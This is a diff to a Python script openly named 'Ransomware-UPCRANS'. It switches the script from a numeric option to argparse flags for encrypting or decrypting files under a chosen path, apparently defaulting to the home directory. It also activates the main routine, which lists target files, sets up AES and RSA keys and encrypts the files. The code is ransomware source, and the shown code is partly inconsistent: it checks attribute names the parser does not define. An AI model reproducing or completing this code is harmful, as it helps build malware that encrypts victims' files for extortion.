@@ -12,19 +12,18 @@ if sys.version_info >= (3, 8, 0):
         time.clock = time.process_time
 
 
-"""
 def parse_args():
     parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
     parser.add_argument('-p', '--path', help='Path to start attack. Default path = %%HOME%%/', action="store")
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Start attack',
+    group.add_argument('-e', '--encrypt', help='Encrypt files',
                         action='store_true')
     group.add_argument('-d', '--decrypt', help='Decrypt files',
                         action='store_true')
 
     return parser.parse_args()
-"""
+
 
 #Initialize both AES and RSA keys and store in class_keys
 def initialize_keys():
@@ -57,9 +56,9 @@ def decrypt_key(AESkey, key):
 
 
 # List files of a system
-def list_files(option):
+def list_files(args):
     path = '.'
-    if option == 1:
+    if args.encrypt == True:
         extensions = ['txt']
 
         files = []
@@ -153,27 +152,26 @@ def decrypt_file(l_files, key):
 
         
 def main(): 
-    option = int(sys.argv[1]) 
-    l_files = list_files(option)
+    args = parse_args()
+    l_files = list_files(args)
     keys = initialize_keys()
-'''
-    if option == 1:
+
+    if args.encryption == True:
         #Encrypt files of your system
         encrypt_file(l_files, keys.AESkey)
 
-    elif option == 2:
+    elif args.decryption == True:
         #Decrypt the encrypted files of your system
         decrypt_file(l_files, keys.AESkey)
 
-    elif option == 3:
+    #elif option == 3:
         #Validate that encrypt and decrypt keys is working
-        enc = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
-        dec = decrypt_key(enc, keys.PRIVATE_RSAKEY)
-        print(dec==keys.AESkey)
+    #    enc = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
+    #    dec = decrypt_key(enc, keys.PRIVATE_RSAKEY)
+    #    print(dec==keys.AESkey)
 
     else:
         print("No option selected")   
-'''
 
 if __name__ == "__main__":
     main()
